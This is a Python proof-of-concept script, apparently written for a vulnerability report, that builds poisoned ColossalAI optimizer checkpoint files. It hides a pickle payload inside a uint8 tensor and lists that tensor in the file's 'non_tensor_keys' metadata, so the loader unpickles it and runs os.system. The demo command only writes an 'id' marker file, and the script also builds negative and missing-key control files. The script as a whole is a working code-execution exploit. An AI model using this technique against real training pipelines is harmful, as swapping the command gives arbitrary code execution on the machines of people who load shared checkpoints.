#!/usr/bin/env python3
"""Build the delivered optimizer-checkpoint artifacts used by this PoC.

The finding is the second, metadata-driven deserialization stage of the async
optimizer-checkpoint format that ColossalAI writes for its ZeRO / Gemini
plugins:

    colossalai/utils/safetensors.py:200-205
        def load_flat(checkpoint_path, seperator: str = "."):
            with safe_open(checkpoint_path, framework="pt") as f:
                metadata = f.metadata()
            state_dict_load = load_file(checkpoint_path)
            state_dict = _unflatten_optim_state_dict(state_dict_load, metadata, seperator)

    colossalai/utils/safetensors.py:96-100
        if metadata is not None and "non_tensor_keys" in metadata:
            non_tensor_keys = json.loads(metadata["non_tensor_keys"])
        else:
            non_tensor_keys = []
        flat_dict = {k: _cast_to_object(v) if k in non_tensor_keys else v for k, v in flat_dict.items()}

    colossalai/utils/safetensors.py:35-38
        def _tensor_to_object(tensor, tensor_size):
            tensor = tensor.cpu()
            buf = tensor.numpy().tobytes()[:tensor_size]
            return _unpickler(io.BytesIO(buf)).load()      # pickle.Unpickler

The safetensors outer container is parsed safely; the file's *metadata* then
decides which already-parsed tensors are reinterpreted as pickle streams.  A
tensor named in ``metadata["non_tensor_keys"]`` has its raw bytes handed to
``pickle.Unpickler.load()``, so whoever distributes the checkpoint chooses what
runs inside the process that resumes from it.

This script writes four artifacts.  All four are built from the same real
``torch.optim.Adam`` state dict, flattened and serialized by the product's own
functions (``_flatten_optim_state_dict()`` + ``prepare()``); the payload bytes
are byte-identical in every arm.  Only the metadata control relation changes:

  pos/optimizer.safetensors
        metadata["non_tensor_keys"] lists the payload tensor
        -> positive: the tensor is routed to _cast_to_object()/_tensor_to_object()
  neg/optimizer.safetensors
        identical file, payload tensor NOT listed in metadata
        -> negative control: same bytes, no object-restore branch
  missing/optimizer.safetensors
        identical file, metadata carries no "non_tensor_keys" key at all
        -> missing-condition control: no key can reach the unpickler
  outer/optimizer.safetensors
        byte-identical copy of pos/, used by outer_parser_control.py to show
        that the plain safetensors parser returns a plain uint8 tensor

No arm contains a ``.py`` file, native library or plugin: the only executable
semantics in the artifact is the pickle stream carried inside a tensor, and the
metadata that points the loader at it.
"""

import hashlib
import json
import os
import pickle
import shutil
from pathlib import Path

import torch

from colossalai.utils.safetensors import _flatten_optim_state_dict, prepare

OUT_ROOT = Path("/work/artifacts")
TARGET_KEY = "state.0.candidate"

# The payload: unpickling this object runs one shell command.  It is kept
# harmless on purpose -- it writes a marker file and records the identity the
# command ran as, which is enough to prove code execution in the victim's
# process.  The same bytes are used in every arm.
PAYLOAD_CMD = "id > PWNED.txt; echo colossalai-optimizer-checkpoint-deserialized >> PWNED.txt"


class OptimizerCheckpointPayload:
    """Object whose unpickling runs ``PAYLOAD_CMD`` via os.system()."""

    def __reduce__(self):
        return (os.system, (PAYLOAD_CMD,))


def payload_bytes() -> bytes:
    return pickle.dumps(OptimizerCheckpointPayload(), protocol=2)


def real_optimizer_state_dict() -> dict:
    """A genuine torch.optim.Adam state dict, as a training run would save it."""
    torch.manual_seed(0)
    model = torch.nn.Linear(4, 2)
    optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)
    model(torch.randn(3, 4)).sum().backward()
    optimizer.step()
    return optimizer.state_dict()


def flat_artifact(state_dict: dict, arm: str):
    """Flatten with the product's serializer and add the attacker tensor."""
    flat_dict, metadata = _flatten_optim_state_dict(state_dict)

    # The only attacker-controlled object in the artifact: one extra flat entry
    # whose bytes are a pickle stream instead of tensor data.  It is a valid
    # uint8 tensor, so the safetensors container stays well formed.
    payload = payload_bytes()
    flat_dict[TARGET_KEY] = torch.tensor(list(payload), dtype=torch.uint8)

    if arm == "pos":
        # the data control relation under test: name the tensor in the metadata
        metadata["non_tensor_keys"].append(TARGET_KEY)
    elif arm == "neg":
        # negative control: same bytes, tensor not named -> no object restore
        pass
    elif arm == "missing":
        # missing-condition control: drop the metadata key entirely
        metadata = None
    else:
        raise ValueError(arm)
    return flat_dict, metadata


def write_product_format(path: Path, flat_dict: dict, metadata) -> None:
    """Serialize exactly like colossalai.utils.safetensors.save() does.

    save() writes the 8-byte little-endian header length, the padded JSON
    header and then the raw tensor bytes; only the writer (TensorNVMe's
    AsyncFileWriter, unavailable on CPU) is replaced here.
    """
    prepared, _tensors, tensor_keys = prepare(flat_dict, metadata)
    with open(path, "wb") as f:
        f.write(prepared.n.to_bytes(8, byteorder="little"))
        f.write(prepared.header_bytes)
        for name in tensor_keys:
            tensor = flat_dict[name].contiguous().cpu()
            f.write(tensor.numpy().tobytes())


def main() -> int:
    if OUT_ROOT.exists():
        shutil.rmtree(OUT_ROOT)
    OUT_ROOT.mkdir(parents=True)

    state_dict = real_optimizer_state_dict()
    payload = payload_bytes()
    print(f"payload: {len(payload)} bytes of pickle, embedded in tensor '{TARGET_KEY}'")
    print()

    sums = []
    for arm in ("pos", "neg", "missing"):
        flat_dict, metadata = flat_artifact(state_dict, arm)
        path = OUT_ROOT / arm / "optimizer.safetensors"
        path.parent.mkdir(parents=True)
        write_product_format(path, flat_dict, metadata)

        digest = hashlib.sha256(path.read_bytes()).hexdigest()
        sums.append((digest, f"{arm}/optimizer.safetensors"))

        listed = None if metadata is None else json.loads(metadata["non_tensor_keys"])
        print(f"{arm:8s} {path}  ({path.stat().st_size} bytes)")
        print(f"         metadata['non_tensor_keys'] = {listed}")
        print(f"         tensors                    = {sorted(flat_dict.keys())}")
        print()

    # outer/: byte-identical copy of pos/, for the plain-parser control
    (OUT_ROOT / "outer").mkdir()
    shutil.copyfile(OUT_ROOT / "pos" / "optimizer.safetensors", OUT_ROOT / "outer" / "optimizer.safetensors")
    digest = hashlib.sha256((OUT_ROOT / "outer" / "optimizer.safetensors").read_bytes()).hexdigest()
    sums.append((digest, "outer/optimizer.safetensors"))
    print(f"{'outer':8s} {OUT_ROOT / 'outer' / 'optimizer.safetensors'}  (copy of pos/)")

    sums_path = Path("/work/SHA256SUMS.txt")
    with open(sums_path, "w") as f:
        for digest, name in sums:
            f.write(f"{digest}  {name}\n")
    print()
    print(f"sha256 sums written to {sums_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
